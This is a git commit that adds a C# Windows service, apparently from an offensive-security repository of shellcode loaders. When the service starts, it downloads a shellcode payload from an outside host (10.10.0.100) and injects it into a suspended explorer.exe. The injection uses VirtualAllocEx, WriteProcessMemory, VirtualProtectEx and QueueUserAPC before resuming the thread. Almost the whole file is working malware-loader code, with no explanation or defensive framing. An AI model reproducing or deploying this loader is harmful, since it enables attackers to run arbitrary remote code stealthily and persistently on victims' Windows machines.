0d9e049fa7183d99f970978b0d0412a7b16cf443
gerbsec <67713732+gerbsec@users.noreply.github.com>
2023-09-30 16:59:08 -0400

    Create service1.cs

---
+++ ShellcodeLoaders/ServiceLoader/service1.cs
@@ -0,0 +1,60 @@
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Linq;
+using System.Net.Http;
+using System.Runtime.InteropServices;
+using System.ServiceProcess;
+using System.Text;
+using System.Threading.Tasks;
+using static loaderservice.Imports.Imports;
+
+
+namespace loaderservice
+{
+    public partial class Service1 : ServiceBase
+    {
+        public Service1()
+        {
+            InitializeComponent();
+        }
+        public static async void attack()
+        {
+            byte[] buf;
+            using (var client = new HttpClient())
+            {
+                client.BaseAddress = new Uri("http://10.10.0.100");
+                buf = await client.GetByteArrayAsync("/http.bin");
+            }
+            STARTUPINFO si = new STARTUPINFO();
+            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+            string app = @"C:\Windows\explorer.exe";
+            bool procinit = CreateProcess(null, app, IntPtr.Zero, IntPtr.Zero, false, CreationFlags.SUSPENDED, IntPtr.Zero, null, ref si, ref pi);
+            IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, buf.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+            IntPtr bytesWritten = IntPtr.Zero;
+            bool resultBool = WriteProcessMemory(pi.hProcess, resultPtr, buf, buf.Length, ref bytesWritten);
+
+            uint oldProtect = 0;
+            IntPtr proc_handle = pi.hProcess;
+            resultBool = VirtualProtectEx(proc_handle, resultPtr, buf.Length, PAGE_EXECUTE_READ, out oldProtect);
+
+            IntPtr ptr = QueueUserAPC(resultPtr, pi.hThread, IntPtr.Zero);
+
+            IntPtr ThreadHandle = pi.hThread;
+            ResumeThread(ThreadHandle);
+        }
+
+        protected override async void OnStart(string[] args)
+        {
+            attack();
+        }
+
+        protected override void OnStop()
+        {
+            Console.Write("hello");
+        }
+    }
+}
